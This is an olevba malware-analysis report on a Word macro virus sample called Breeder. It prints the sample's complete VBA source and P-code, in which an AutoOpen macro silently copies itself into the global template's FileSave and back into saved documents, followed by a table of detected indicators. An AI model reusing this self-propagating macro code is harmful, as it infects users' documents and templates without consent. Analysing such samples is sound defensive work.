olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Breeder
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Breeder - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Breeder - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'  BREEDER BY -=>NEMESIS<=-  5/4/97
'  "DO NOT PROVOKE THE INTROVERT"

Public Sub MAIN()
Dim ThisFile$
Dim dlg As Object
Dim TheName$

On Error GoTo -1: On Error GoTo TheEnd
ThisFile$ = WordBasic.[MacroFileName$]()
If UCase(WordBasic.[Right$](ThisFile$, 4)) = ".DOT" Then
    Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    TheName$ = WordBasic.[FileNameFromWindow$]()
    If TheName$ = "" Then
        WordBasic.Dialog.FileSaveAs dlg
        If dlg.Format = 0 Then dlg.Format = 1
    Else
        WordBasic.FileSaveAs Format:=1
    End If
        WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":AutoOpen"
        WordBasic.FileSaveAs dlg
Else
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    WordBasic.MacroCopy ThisFile$ + ":AutoOpen", "Global:FileSave"
End If

TheEnd:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Breeder
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2221 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0022 "  BREEDER BY -=>NEMESIS<=-  5/4/97"
' Line #2:
' 	QuoteRem 0x0000 0x0020 "  "DO NOT PROVOKE THE INTROVERT""
' Line #3:
' Line #4:
' 	FuncDefn (Public Sub MAIN())
' Line #5:
' 	Dim 
' 	VarDefn ThisFile
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #7:
' 	Dim 
' 	VarDefn TheName
' Line #8:
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError TheEnd 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	St ThisFile$ 
' Line #11:
' 	Ld ThisFile$ 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".DOT"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	St TheName$ 
' Line #15:
' 	Ld TheName$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #17:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #25:
' 	Ld ThisFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' 	Label TheEnd 
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

